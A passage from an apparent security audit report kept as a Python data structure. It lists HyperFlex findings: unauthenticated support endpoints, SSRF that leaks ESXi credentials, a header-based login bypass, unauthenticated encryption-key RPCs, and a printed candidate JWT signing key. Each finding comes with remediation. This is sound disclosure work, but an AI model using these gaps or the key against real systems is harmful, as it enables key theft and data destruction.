            "web.xml (servlet-mapping at line 67) but has no corresponding filter-mapping entry. "
            "All authentication filters (AuditFilter, SPPrivilegedAuth, SessionAuth, KerberosAuth, "
            "SPBasicAuth, SPAuth) are mapped only to /rest/*, /internalsupport/*, /upload/*, and "
            "/v1/* — leaving /storfs-support/* unprotected. "
            "The servlet accepts GET and POST. With no action parameter it returns an HTML page "
            "with links to ?action=extended and ?action=light. When action=extended it executes "
            "ProcessBuilder(['/bin/bash', '-c', 'exec /bin/storfs-support --extended > /dev/null']) "
            "on the stCtlVM; when action=light it runs 'exec /bin/storfs-support > /dev/null'. "
            "After waiting for the process to exit with code 0, it reads the newest .gz file from "
            "/var/support/ and streams it as application/zip to the unauthenticated caller. "
            "The storfs-support bundle contains system logs, network configuration, disk layout, "
            "ZooKeeper state, and service credentials from the storage controller VM."
        ),
        "code_evidence": {
            "servlet_class": "com.storvisor.sysmgmt.service.StorfsSupportBundle",
            "web_xml_servlet_mapping": "/storfs-support/* (ROOT.war web.xml line 67)",
            "auth_filter_mapping": "None — no filter-mapping for /storfs-support/* in ROOT.war",
            "action_extended_command": "/bin/bash -c exec /bin/storfs-support --extended > /dev/null",
            "action_light_command": "/bin/bash -c exec /bin/storfs-support > /dev/null",
            "output_source": "/var/support/ (newest .gz file via FileUtils.getNewestGzFile)",
            "content_type": "application/zip",
            "bytecode_ref": (
                "StorfsSupportBundle.processRequest offset 151-173 (extended branch), "
                "offset 182-208 (light branch); string literals ldc #101 /bin/bash, "
                "ldc #105 'exec /bin/storfs-support --extended > /dev/null', "
                "ldc #110 'exec /bin/storfs-support > /dev/null', "
                "ldc #166 /var/support/"
            ),
        },
        "versions_affected": ["6.0.2b-44423 (stCtlVM, ROOT.war)"],
        "remediation": (
            "Add filter-mapping entries for /storfs-support/* identical to those for "
            "/internalsupport/* (AuditFilter, SPPrivilegedAuth, SessionAuth, SPBasicAuth, SPAuth). "
            "Require authentication before any support bundle operation on the stCtlVM."
        ),
    },
    "HX-F32": {
        "title": "Diesel Connector KEK Distribution Endpoint Binds to All Interfaces With No Confirmed Client Auth",
        "severity": "HIGH",
        "component": (
            "hxdp-connector Go binary (UPX-packed, 25MB unpacked); "
            "diesel/encryption package — StartEncryptionHandler / getKeyEncryptionKeyHandler; "
            "graceful TLS server on :35333 (0.0.0.0, all interfaces)"
        ),
        "description": (
            "The HyperFlex device connector binary launches a TLS HTTP server on :35333 (all "
            "interfaces) via graceful.(*Server).ListenAndServeTLS. The server registers a "
            "gorilla/mux route GET /v1/hyperflex/KeyEncryptionKeys handled by "
            "(*EncryptionClient).getKeyEncryptionKeyHandler. The handler returns the cluster "
            "Key Encryption Key (KEK) — the root key used to protect all data encryption keys "
            "for the HyperFlex distributed storage layer. "
            "decryptKek() is a method that copies 96 bytes of the EncryptionClient struct onto "
            "the local stack frame and returns the plaintext KEK string at field offsets "
            "+0x48/+0x50 (Go string header: ptr, len). The actual RSA decryption "
            "((*DecryptObjectType).RsaDecrypt at 0xa05ea0, private key /etc/springpath/secure/root_file.pub) "
            "is performed once at connector initialization; subsequent calls to decryptKek() "
            "return the cached plaintext. "
            "The connector_auth package (barcelona/adconnector/connector_auth) provides "
            "clientAuthUsingHash / ClientAuthSha512 using SipHash MAC — but this auth layer "
            "is applied to the WebSocket tunnel toward Cisco Intersight, not to the local "
            ":35333 HTTP endpoint. The HTTP-layer auth middleware baseHandler is defined in "
            "diesel/witness and is called from StartWitnessServer; its application to "
            "StartEncryptionHandler routes could not be statically confirmed from binary "
            "analysis. The server uses only server-side TLS (no static evidence of "
            "tls.Config.ClientAuth = RequireAnyClientCert or RequireAndVerifyClientCert). "
            "Any host on the network that can reach TCP port 35333 and complete a TLS "
            "handshake with the server certificate can issue GET /v1/hyperflex/KeyEncryptionKeys "
            "and receive the KEK. With the KEK, a network-adjacent attacker can decrypt all "
            "data encryption keys protecting the HyperFlex storage cluster."
        ),
        "code_evidence": {
            "binary": "hxdp-connector (UPX-packed Go 1.23.4 ELF, 25,743,512 bytes unpacked)",
            "server_function": "graceful.(*Server).ListenAndServeTLS at functab PC 0x702ac0",
            "bind_address": "':35333' — Go net.Listen default binds to 0.0.0.0:35333 (file 0xfa57d1 in .rodata)",
            "route": (
                "GET /v1/hyperflex/KeyEncryptionKeys — string at .rodata file 0xde0bfc, "
                "directly adjacent (zero-gap) to 'Initializing encryption handler' log string "
                "(file 0xde0bdd) in Go's packed string literal pool"
            ),
            "handler": (
                "(*EncryptionClient).getKeyEncryptionKeyHandler — funcnametab at file 0x11a22f1; "
                "closure (*EncryptionClient).getKeyEncryptionKeyHandler.func1 at file 0x11a2442"
            ),
            "key_retrieval": (
                "(*EncryptionClient).decryptKek at functab PC 0xa05ee0: copies 96-byte "
                "EncryptionClient struct frame (duffcopy at 0x47d44c), returns string at "
                "offset +0x48 (ptr) / +0x50 (len) — plaintext KEK cached after init RSA decrypt"
            ),
            "rsa_decrypt": (
                "(*DecryptObjectType).RsaDecrypt at functab PC 0xa05ea0; "
                "private key path: /etc/springpath/secure/root_file.pub (file 0xdea2d2)"
            ),
            "connector_auth": (
                "barcelona/adconnector/connector_auth — clientAuthUsingHash, ClientAuthSha512 "
                "(SipHash MAC via dchest/siphash@v1.2.3); source: connector_auth.go; "
                "APPLIED TO: WebSocket connector to Intersight, NOT to :35333 HTTP routes"
            ),
            "tls_config": (
                "graceful.ListenAndServeTLS: server-side TLS only; no static evidence of "
                "tls.Config.ClientAuth = RequireAnyClientCert in the :35333 configuration"
            ),
            "base_handler": (
                "diesel/witness.StartWitnessServer.(*witness).baseHandler.func4.1 at functab "
                "PC 0xe0ae20; application to encryption routes unconfirmed from binary analysis"
            ),
            "cipher_type_registry": (
                "adsecret/barcelona cipher types at .rodata file 0xdbcdef: "
                "Locked|STREET|simple|cisco.divide|pbkdf2|bcrypt|shared|system|Fanout|X25519 — "
                "cisco.divide is a proprietary Cisco key-splitting scheme compiled into the binary"
            ),
        },
        "versions_affected": ["hxdp-connector 1.0.11-20250305 (Go 1.23.4)"],
        "remediation": (
            "Bind :35333 to 127.0.0.1 if the KEK endpoint is only consumed by local "
            "HyperFlex services. If network binding is required, enforce mTLS by setting "
            "tls.Config.ClientAuth = RequireAndVerifyClientCert with a per-node CA. "
            "Apply baseHandler auth middleware explicitly to all routes in "
            "StartEncryptionHandler, not only to witness routes. Do not cache the plaintext "
            "KEK in a heap-allocated struct — re-decrypt on demand and zero memory after use."
        ),
    },
    "HX-F31": {
        "title": "StorvisorSupportBundle Servlet Enables Unauthenticated SSRF With ESXi Credential Exfiltration",
        "severity": "HIGH",
        "component": (
            "ROOT.war / com.storvisor.sysmgmt.service.StorvisorSupportBundle "
            "(stCtlVM, URL pattern /st-support/*, no filter mapping)"
        ),
        "description": (
            "The StorvisorSupportBundle HttpServlet is registered at /st-support/* in ROOT.war "
            "web.xml but has no filter-mapping entry — identical misconfiguration to HX-F30. "
            "The servlet reads a host[] query parameter array from the request. For each hostname "
            "it constructs the URL: https://HOSTNAME/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath "
            "(template string from BootstrapMethods constant pool entry #161: "
            "'https://\\u0001/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath'). "
            "It then instantiates HostCredentialsAccess(), which connects to the local cluster "
            "service (localhost) and retrieves stored ESXi host credentials "
            "(EsxCredential.username, EsxCredential.password from ServiceAccess). "
            "WebDownloader.getStream(url, username, password) calls "
            "java.net.Authenticator.setDefault(new Authenticator(username, password)) then "
            "new URL(url).openStream() — sending the ESXi credentials as an HTTP Basic "
            "Authorization header in the outbound request to the attacker-supplied hostname. "
            "The attacker controls the hostname via the host= request parameter, which is "
            "interpolated directly into the HTTPS URL before the credential-authenticated request "
            "is made. The response is streamed back as a zip entry named HOSTNAME.tar.gz."
        ),
        "code_evidence": {
            "servlet_class": "com.storvisor.sysmgmt.service.StorvisorSupportBundle",
            "web_xml_servlet_mapping": "/st-support/* (ROOT.war web.xml line 56)",
            "auth_filter_mapping": "None — no filter-mapping for /st-support/* in ROOT.war",
            "user_controlled_input": "host[] query parameter (HttpServletRequest.getParameterValues('host'))",
            "url_template": (
                "https://HOSTNAME/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath "
                "(BootstrapMethods #1, constant pool #161)"
            ),
            "credential_source": (
                "HostCredentialsAccess() -> ServiceAccess('localhost') -> "
                "EsxCredential.username + EsxCredential.password"
            ),
            "credential_dispatch": (
                "WebDownloader.getStream(url, getUserName(), getPassword()) -> "
                "java.net.Authenticator.setDefault(BasicAuthenticator) -> "
                "new URL(url).openStream()  [Authorization: Basic header sent to attacker host]"
            ),
            "zip_entry_template": "HOSTNAME.tar.gz (BootstrapMethods #0, constant pool #159)",
            "bytecode_ref": (
                "StorvisorSupportBundle.processRequest offset 22-152: "
                "getParameterValues('host') at offset 22-30, "
                "HostCredentialsAccess.<init> at offset 56-63, "
                "invokedynamic #1 URL construction at offset 130-135, "
                "WebDownloader.getStream call at offset 137-152"
            ),
        },
        "versions_affected": ["6.0.2b-44423 (stCtlVM, ROOT.war)"],
        "remediation": (
            "Add filter-mapping entries for /st-support/* identical to those for "
            "/internalsupport/* (AuditFilter, SPPrivilegedAuth, SessionAuth, SPBasicAuth, SPAuth). "
            "Validate that the host parameter matches the expected cluster node IP range before "
            "constructing any outbound URL. Do not use java.net.Authenticator.setDefault() "
            "(JVM-global side effect) for per-request authentication; use per-connection "
            "credential injection instead."
        ),
    },
    "HX-F33": {
        "title": "SPPrivilegeAuthImpl Trusts X-RootSessionID Header for User Identity — Localhost Caller Gets User Impersonation",
        "severity": "HIGH",
        "component": (
            "authfilter-1.0.0.jar deployed as shared Tomcat lib; "
            "com.springpath.hx.aaa.filters.privilegeAuthFilter.SSOPrivilegeAuthImpl.doFilter(); "
            "all WARs on Tomcat (coreapi, auth, dataprotection, encryption, iscsi, securityservice, "
            "slservice, backupservice, supportservice, hxupgrade)"
        ),
        "description": (
            "SSOPrivilegeAuthImpl is the first servlet filter in every HyperFlex REST API WAR's "
            "filter chain. When an inbound HTTP request includes the X-RootSessionID header, the "
            "filter calls HxSecurity.getInstance().getLocalSessionId() and compares the header "
            "value against the result. If they match, the filter does NOT perform JWT or credential "
            "validation — instead it reads X-LoggedInUser, X-Scope, and X-RequestInitiator from "
            "the same HTTP request and sets com.springpath.hx.aaa.authenticateduser to the "
            "caller-supplied X-LoggedInUser value, then marks the request Authenticated=True "
            "before passing to chain.doFilter(). The authenticated identity is fully "
            "caller-controlled: any caller who can present a valid X-RootSessionID can "
            "authenticate as any user including local/admin with any scope. The local session ID "
            "is generated at service startup via HxSecurity and its storage location has not "
            "been confirmed, but candidates include ZooKeeper state and local filesystem paths "
            "under /etc/springpath/. Any process with localhost access, or any SSRF gadget in "
            "the REST stack (see HX-F30, HX-F31), that can obtain or predict the local session "
            "ID can submit requests authenticated as any cluster user, bypassing all JWT, "
            "session cookie, Kerberos, and basic-auth filter stages. X-AllClients: ALL-CLIENTS "
            "in the same filter additionally sets client scope to 'ALL-CLIENTS' without "
            "per-user token validation, broadening ServiceAccessAuth scope."
        ),
        "code_evidence": {
            "filter_class": (
                "com.springpath.hx.aaa.filters.privilegeAuthFilter.SSOPrivilegeAuthImpl "
                "(authfilter-1.0.0.jar; shared Tomcat lib)"
            ),
            "bypass_header": "X-RootSessionID",
            "identity_control_header": "X-LoggedInUser (caller-controlled)",
            "scope_control_header": "X-Scope: READ | MODIFY (caller-controlled)",
            "initiator_header": "X-RequestInitiator (caller-controlled)",
            "session_id_source": (
                "HxSecurity.getInstance().getLocalSessionId() reads "
                "/etc/hyperflex/secure/root_file.pub via FileInputStream + BufferedReader + trim(); "
                "field: localhostRootFilePub (static string, not rotated per-session)"
            ),
            "attribute_set_on_bypass": (
                "com.springpath.hx.aaa.authenticateduser = X-LoggedInUser; "
                "com.springpath.hx.aaa.authenticateduserscope = X-Scope; "
                "Authenticated = True"
            ),
            "all_clients_path": (
                "X-AllClients: ALL-CLIENTS -> checkAndSetClientId() -> "
                "com.springpath.hx.aaa.clientid = 'ALL-CLIENTS' (no token check)"
            ),
            "filter_position": "Position 2 of 7; before SessionAuth, KerberosAuth, ServiceAccessAuth, SPBasicAuth, SPAuth",
            "log_sentinel": (
                "'Got a good xRootSessionID, but one these headers were not set: {}, {}, {}' — "
                "three companion headers required but caller-supplied"
            ),
        },
        "escalation_note": (
            "The session ID is the STATIC CONTENTS of /etc/hyperflex/secure/root_file.pub — "
            "not a dynamic per-session nonce. The file is likely the RSA public key also used "
            "for KEK operations (see HX-F32: connector uses /etc/springpath/secure/root_file.pub; "
            "these paths may be symlinked). A public key file is world-readable in many default "
            "Linux configurations, making the bypass unconditionally exploitable from localhost "
            "without requiring any guessing or brute force."
        ),
        "versions_affected": ["6.0.2b-44423 (all JAX-RS REST API WARs via shared authfilter lib)"],
        "remediation": (
            "Replace the static file-based session ID with a per-startup random token generated "
            "in memory (crypto/rand, 256-bit minimum) not written to disk. Accept X-RootSessionID "
            "only from 127.0.0.1 at the network firewall layer. Derive authenticated user identity "
            "from the local session record, not from caller-supplied X-LoggedInUser. Restrict "
            "permissions on /etc/hyperflex/secure/ to root:root 0600."
        ),
    },
    "HX-F36": {
        "title": "Hardcoded Candidate JWT Signing Key in hx-auth Authentication Binary",
        "severity": "HIGH",
        "component": (
            "hx-auth Go binary (ELF64, dynamically linked, not stripped); "
            "main.createToken / main.getjwtToken; port 8082"
        ),
        "description": (
            "The hx-auth binary (handles login, token creation, logout, and password change on "
            "port 8082) contains the literal string 'RHGocmgN90R4ShL_WnQ5GJSgGzADV678' at file "
            "offset 0x3cc53f, embedded in the binary's string constant table between unrelated "
            "Go runtime error strings. The binary implements JWT creation (main.createToken, "
            "main.getjwtToken), JWT-based session management (main.AddCookie, main.RemoveCookie, "
            "main.getUserSessionInfo), and references HS256/HS384/HS512/RS256/RS384/RS512/PS256 "
            "algorithm identifiers in its string table. A 34-character URL-safe alphanumeric "
            "string embedded in a JWT-issuing binary is consistent with a hardcoded HMAC signing "
            "key for HS256 (minimum 256-bit / 32-byte key). If confirmed as the JWT signing "
            "secret, any attacker can forge valid session tokens for any user and scope without "
            "credentials, bypassing all authentication in every REST API WAR. The binary also "
            "contains main.isMockDevMode, suggesting a development bypass path that may activate "
            "when a flag or environment variable is set. The binary's full function symbol table "
            "is accessible (not stripped, dynamically linked), enabling direct function-level "
            "analysis without disassembly."
        ),
        "code_evidence": {
            "binary": "hx-auth (ELF64, dynamically linked, debug info present, not stripped; 9,955,896 bytes)",
            "candidate_secret": "RHGocmgN90R4ShL_WnQ5GJSgGzADV678",
            "file_offset": "0x3cc53f",
            "string_length_chars": "34",
            "jwt_functions": "main.createToken, main.getjwtToken, main.getjwtToken.func1",
            "jwt_algorithms_in_string_table": "ES256 ES384 ES512 HS256 HS384 HS512 RS256 RS384 RS512 PS256 PS384 PS512",
            "auth_functions": (
                "main.loginHandler, main.validateLogin, main.verifyHandler, "
                "main.logoutHandler, main.getUserSessionInfo"
            ),
            "dev_mode_flag": "main.isMockDevMode (dev/test bypass path in production binary)",
            "crypto_functions": "main.decrypt, NewCBCDecrypter (AES-CBC ticket decryption)",
            "listen_port": ":8082 (embedded in binary string table)",
        },
        "versions_affected": ["6.0.2b-44423 (hx-auth binary)"],
        "remediation": (
            "Remove hardcoded signing key from hx-auth binary. Generate the JWT signing secret "
            "from a per-deployment cryptographic random source (crypto/rand, 256-bit minimum) "
            "and inject at service startup via environment variable or a secrets manager. "
            "Disable and remove main.isMockDevMode code paths from production builds. "
            "Rotate JWT signing secrets on any firmware upgrade or credential rotation event."
        ),
    },
    "HX-F34": {
        "title": "All GET Requests Exempt from Audit Logging — Silent Read-Path Exfiltration Window",
        "severity": "MEDIUM",
        "component": (
            "authfilter-1.0.0.jar/application.conf; "
            "com.springpath.hx.aaa.filters.utils.AAAFilterHelper; "
            "com.springpath.hx.aaa.filters.auditFilter.AuditFilterImpl; "
            "config: sysmgmt.auditHttpVerbsToSkip = [\"GET\"]"
        ),
        "description": (
            "AuditFilterImpl (position 1 of 7 in every WAR filter chain) checks "
            "AAAFilterHelper.auditHttpVerbsToSkip before writing audit log entries. "
            "The shipped configuration 'auditHttpVerbsToSkip = [\"GET\"]' means no GET request "
            "to any HyperFlex REST API endpoint generates an audit log entry regardless of what "
            "data is returned. This covers all read-path endpoints across coreapi (clusters, "
            "datastores, nodes, snapshots, VMs, network config), dataprotection (replication "
            "peers with credentials, groups, schedules), backupservice (policies, VM snapshots), "
            "slservice (licensing), and all other WARs. An attacker with a valid token can "
            "enumerate cluster topology, snapshot inventory, replication peer credentials "
            "via GET /dataprotection/v1/peers, VM lists, and all other read-accessible data "
            "with no audit trail. Combined with the 18-day token lifetime (HX-F35), this "
            "provides a persistent silent reconnaissance window."
        ),
        "code_evidence": {
            "config_path": "authfilter-1.0.0.jar/application.conf",
            "config_key": "sysmgmt.auditHttpVerbsToSkip = [\"GET\"]",
            "audit_filter": "com.springpath.hx.aaa.filters.auditFilter.AuditFilterImpl",
            "helper_method": "AAAFilterHelper.isSkipHttpVerbForAudit(httpVerb)",
            "example_silent_endpoints": (
                "GET /coreapi/v1/clusters, GET /coreapi/v1/datastores, "
                "GET /coreapi/v1/summary, GET /dataprotection/v1/peers, "
                "GET /dataprotection/v1/storageVolumeGroup, GET /backupservice/v1/vms"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove GET from auditHttpVerbsToSkip. Audit all authenticated API requests "
            "regardless of HTTP verb. Apply anomaly detection to per-session GET request volumes."
        ),
    },
    "HX-F35": {
        "title": "Default JWT Session Token Lifetime of 18 Days — Persistent Access After Single Credential Compromise",
        "severity": "MEDIUM",
        "component": (
            "authfilter-1.0.0.jar/application.conf; "
            "sysmgmt.defaultTokenLifeTime = 1555200000 ms (18 days)"
        ),
        "description": (
            "HyperFlex REST API session tokens (JWT) have a default lifetime of 1,555,200,000 "
            "milliseconds (18 days). A token obtained via credential compromise, phishing, or "
            "SSRF-based impersonation (HX-F33) remains valid for 18 days without "
            "re-authentication. Because the token format is JWT (stateless validation possible), "
            "a password change does not invalidate existing tokens unless the server maintains "
            "a revocation list. The idle timeout (1,800,000 ms = 30 min) mitigates dormant "
            "sessions, but a low-volume attacker polling at sub-30-minute intervals keeps "
            "the token active for the full 18-day window while generating no audit log entries "
            "for GET-method polling (HX-F34). maxSessionsPerUser = 8 and maxTotalSessions = 16 "
            "are low enough that an attacker holding a token does not noticeably consume session "
            "capacity."
        ),
        "code_evidence": {
            "config_path": "authfilter-1.0.0.jar/application.conf",
            "defaultTokenLifeTime_ms": "1555200000",
            "defaultTokenLifeTime_days": "18.0",
            "defaultIdleTimeout_ms": "1800000 (30 min)",
            "maxSessionsPerUser": "8",
            "maxTotalSessions": "16",
            "rateLimitWindow": "15 min, max 5 auth attempts",
            "failedLoginLockout": "10 attempts then 120s lockout",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Reduce defaultTokenLifeTime to 8 hours (28800000 ms) maximum. "
            "Implement server-side token revocation tied to password change events. "
            "Invalidate all existing tokens when cluster admin credentials are rotated."
        ),
    },
    "HX-F37": {
        "title": "iSCSI CHAP Decrypt Key Material Co-located with Encrypted Secrets in /etc/hyperflex/secure/",
        "severity": "HIGH",
        "component": (
            "iscsisvc (hx-iscsi package); custom Cisco extension to upstream istgt iSCSI target. "
            "Source path: /opt/git/cypress/opensrc/istgt/src/chap_util.c"
        ),
        "description": (
            "The iscsisvc binary decrypts CHAP secrets using a PKCS#12 keystore. "
            "The keystore password is read from /etc/hyperflex/secure/hyperflex_security.properties "
            "(XML element <entry key=\"keystore_password\">), and the keystore itself is at "
            "/etc/hyperflex/secure/hyperflex_keystore.p12. Both artifacts are in the same directory "
            "as other sensitive HyperFlex material (root_file.pub). Any principal with read access "
            "to /etc/hyperflex/secure/ can extract the decryption key without ZooKeeper access, "
            "then decrypt any CHAP secret read from ZooKeeper. The symmetric protection chain "
            "is broken: the lock and the key are in the same box."
        ),
        "code_evidence": {
            "binary": "iscsisvc (ELF 64-bit, not stripped, ~16MB)",
            "decrypt_init_fn": "chap_decrypt_init @ 0x28ba30",
            "key_path_fn": "hx_get_chap_key_path @ 0x28acb0",
            "read_json_fn": "hx_read_chap_json_str @ 0x28acd0",
            "keystore_password_file": "/etc/hyperflex/secure/hyperflex_security.properties",
            "keystore_password_xml_key": "<entry key=\"keystore_password\">",
            "keystore_file": "/etc/hyperflex/secure/hyperflex_keystore.p12",
            "openssl_init_calls": (
                "OPENSSL_init_crypto(0xc, NULL) [ADD_ALL_CIPHERS|ADD_ALL_DIGESTS]; "
                "OPENSSL_init_crypto(0x2, NULL) [LOAD_CRYPTO_STRINGS]"
            ),
            "error_strings": [
                "%sCHAP DECRYPT: Keystore password file not found",
                "%sCHAP DECRYPT: Failure to parse keystore password",
                "%sCHAP DECRYPT:decrypt_data error during fetching keystore password",
                "%sCHAP DECRYPT:decrypt_data Invalid Keystore path",
                "%sCHAP DECRYPT:decrypt_data Failure during keystore get",
            ],
            "sensitive_dir_also_contains": "root_file.pub (session bypass token, see HX-F33)",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Store the PKCS#12 keystore password in a separate hardware-backed secret store or "
            "TPM-sealed location. Do not co-locate the keystore password with the keystore. "
            "Restrict /etc/hyperflex/secure/ to root:root 0700 and audit all service accounts "
            "that require read access."
        ),
    },
    "HX-F38": {
        "title": "iSCSI CHAP Credentials Stored in ZooKeeper at Predictable Path /chap/<target>",
        "severity": "HIGH",
        "component": (
            "iscsisvc (hx-iscsi package); ZooKeeper credential store integration. "
            "Source path: /opt/git/cypress/opensrc/istgt/src/chap_util.c"
        ),
        "description": (
            "The iscsisvc binary reads iSCSI CHAP credentials from ZooKeeper at the path "
            "/chap/<target_name> (format string /chap/%s). The ZK node contains a JSON object "
            "{\"chapName\": \"...\", \"chapSecret\": \"<encrypted>\"}. The encrypted secret is "
            "decryptable using key material from /etc/hyperflex/secure/ (see HX-F37). "
            "ZooKeeper UUID-based auth is controlled by the CRMDB_ZKEnableUUIDAuth runtime flag "
            "(not hardcoded on), making ZK node-level access control optional. "
            "Both u-chap (initiator secret) and s-chap (target secret for mutual CHAP) are "
            "loaded from this ZK path, meaning mutual CHAP secrets are equally exposed. "
            "ZooKeeper Exhibitor is also accessible on port 8180 (see HX-F12)."
        ),
        "code_evidence": {
            "binary": "iscsisvc (ELF 64-bit, not stripped, ~16MB)",
            "zk_path_format": "/chap/%s",
            "json_fields": ["chapName", "chapSecret"],
            "chap_types": "u-chap (initiator), s-chap (mutual target secret)",
            "zk_path_fn": "hx_get_chap_key_path @ 0x28acb0 — snprintf(buf, 0x100, '/chap/%s', name)",
            "zk_read_fn": "hx_istgt_get_json @ 0x23a380 (called from hx_read_chap_json_str)",
            "json_parse_fn": "cJSON_Parse / cJSON_GetObjectItem (chapName, chapSecret)",
            "zk_auth_flag": "CRMDB_ZKEnableUUIDAuth (runtime function, not a compile-time constant)",
            "error_strings": [
                "%sHX_ISTGT_CF: Failed to get chap cred from zk.",
                "%sHX_ISTGT_CF: Failed to parse JSON CHAP zk string %s.",
                "%sHX_ISTGT_CF: Failed to get CHAP user name.",
                "%sHX_ISTGT_CF: Failed to get CHAP secret.",
                "%sHX_ISTGT_CF: Failed to get u-chap. err = %u",
                "%sHX_ISTGT_CF: Failed to get s-chap. err = %u",
            ],
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable CRMDB_ZKEnableUUIDAuth on all cluster nodes and set strict ACLs on /chap/* "
            "ZooKeeper nodes. Alternatively, migrate CHAP credential storage off ZooKeeper into "
            "a purpose-built secrets manager. Audit ZooKeeper ACL configuration at deployment time."
        ),
    },
    "HX-F39": {
        "title": "iSCSI Target Accepts AuthMethod None — Storage Accessible Without Authentication",
        "severity": "HIGH",
        "component": (
            "iscsisvc (hx-iscsi package); custom Cisco extension to upstream istgt iSCSI target. "
            "Affects both data sessions (AuthMethod) and discovery sessions (DiscoveryAuthMethod)."
        ),
        "description": (
            "The iscsisvc binary accepts AuthMethod None and DiscoveryAuthMethod None as valid "
            "per-LU and global configuration values. The AuthMethod Auto setting instructs the "
            "target to allow the initiator to choose no authentication. Both are valid runtime "
            "configurations persisted via ZooKeeper (/iscsi/config). When either is set, an "
            "iSCSI initiator can log in without supplying CHAP credentials, gaining direct "
            "block-level read/write access to storage volumes. The config parser also accepts "
            "AuthGroup None and DiscoveryAuthGroup None for group-level auth bypass. "
            "No compile-time enforcement requires CHAP — the protection is entirely deployment-dependent."
        ),
        "code_evidence": {
            "binary": "iscsisvc (ELF 64-bit, not stripped, ~16MB)",
            "auth_method_strings": [
                "%sAuthMethod None",
                "%sAuthMethod Auto",
                "%sAuthMethod %s %s",
                "%sDiscoveryAuthMethod None",
                "%sDiscoveryAuthMethod Auto",
                "%sDiscoveryAuthMethod %s %s",
                "%sAuthGroup None",
                "%sDiscoveryAuthGroup None",
            ],
            "auth_config_error": "%sAuthMethod is empty",
            "config_zk_path": "/iscsi/config",
            "initiator_auth_field": "lu->auth_chap %d (per-LU auth flag)",
            "chap_combined_method": "CHAP,None (comma list — None is a valid member)",
            "no_enforcement": (
                "No hardcoded requirement for CHAP; auth method is loaded from ZK config at runtime"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set AuthMethod CHAP and DiscoveryAuthMethod CHAP as mandatory defaults in the "
            "HyperFlex installer and validate on every cluster upgrade. Remove None and Auto "
            "from the set of accepted AuthMethod values, or enforce CHAP at the configuration "
            "management layer with a startup validation check that aborts iscsisvc if auth is None."
        ),
    },
    "HX-F40": {
        "title": "Unauthenticated getDataEncryptionKeys Thrift RPC in storfs — DARE Key Exfiltration",
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformEncProcessor. "
            "Thread: sysmgmtNonBlockingEncThreadId (dedicated enc Thrift server thread)."
        ),
        "description": (
            "The storfs binary hosts a dedicated Apache Thrift server "
            "(stNonBlockingEncServer, TNonblockingServer) that exposes the StPlatformEnc service. "
            "The process_getDataEncryptionKeys handler parses the incoming Thrift request, "
            "calls readMessageEnd(), then immediately invokes the handler "
            "StPlatformEncDispatcher::getDataEncryptionKeys without any authentication check. "
            "The args struct StPlatformEnc_getDataEncryptionKeys_args contains no credential fields. "
            "A successful call returns an HxEncryptionData object containing all Data Encryption Keys "
            "(DEKs) for the cluster, which directly defeats the Data At Rest Encryption (DARE) feature. "
            "The dispatchCall implementation is pure string-comparison method routing with no "
            "Thrift-layer auth header validation. The server is started unconditionally by "
            "SysMgmt_InitInternal alongside the main sysmgmt Thrift server."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "handler_fn": "StPlatformEncProcessor::process_getDataEncryptionKeys @ 0x9ade70",
            "dispatcher_fn": "StPlatformEncDispatcher::getDataEncryptionKeys @ 0xa2b9e0",
            "args_read_fn": "StPlatformEnc_getDataEncryptionKeys_args::read @ 0x9a7510",
            "args_struct": "StPlatformEnc_getDataEncryptionKeys_args (no auth fields in struct)",
            "return_type": "HxEncryptionData (vtable _ZTVN...16HxEncryptionDataE @ 0x10b7ba0)",
            "server_global": "stNonBlockingEncServer @ BSS:0x1bd0970",
            "server_start_fn": "StartNonBlockingEncServer @ 0x8c2910",
            "server_thread": "_ZL29sysmgmtNonBlockingEncThreadId (created by SysMgmt_InitInternal @ 0x8c1dc0)",
            "dispatch_fn": "StPlatformEncProcessor::dispatchCall @ 0x9af4f0 — string-match dispatch, no auth",
            "kv_key_fn": "KVGetDataEncryptionKey @ 0x61a8d0 (lower-level ZK/KV key retrieval)",
            "auth_check": "NONE — no authentication before handler dispatch confirmed in disasm",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind stNonBlockingEncServer to 127.0.0.1 only. "
            "Add a caller-identity verification step at the Thrift dispatch layer "
            "(TLS mutual auth or a pre-dispatch token check). "
            "If the StPlatformEnc service must remain a Thrift interface, require a session token "
            "verified against the hx-auth service before returning DEK material. "
            "Consider replacing the Thrift enc interface with a Unix-domain socket accessible "
            "only to root-owned processes."
        ),
    },
    "HX-F41": {
        "title": "Unauthenticated setDataEncryptionKeys Thrift RPC in storfs — Key Replacement Attack",
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformEncProcessor. "
            "Thread: sysmgmtNonBlockingEncThreadId."
        ),
        "description": (
            "The process_setDataEncryptionKeys handler in the StPlatformEncProcessor Thrift service "
            "accepts an HxEncryptionData struct and calls the handler without authentication. "
            "The args struct StPlatformEnc_setDataEncryptionKeys_args contains the HxEncryptionData "
            "payload (new key material) but no credential or authorization fields. "
            "An unauthenticated caller can replace the cluster Data Encryption Keys with "
            "attacker-controlled values, rendering all encrypted storage volumes permanently "
            "inaccessible — a complete data destruction primitive. Combined with HX-F40 "
            "(unauthenticated key read), a full DEK exfiltrate-then-replace sequence is possible "
            "from any host that can reach the storfs Thrift port."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "handler_fn": "StPlatformEncProcessor::process_setDataEncryptionKeys @ 0x9ad880",
            "args_read_fn": "StPlatformEnc_setDataEncryptionKeys_args::read @ 0x9a6f50",
            "args_vtable": "_ZTVN...40StPlatformEnc_setDataEncryptionKeys_argsE @ 0x10b74b0",
            "payload_type": "HxEncryptionData (attacker-controlled key_elements vector)",
            "auth_check": "NONE — identical dispatch pattern to HX-F40, confirmed in disasm",
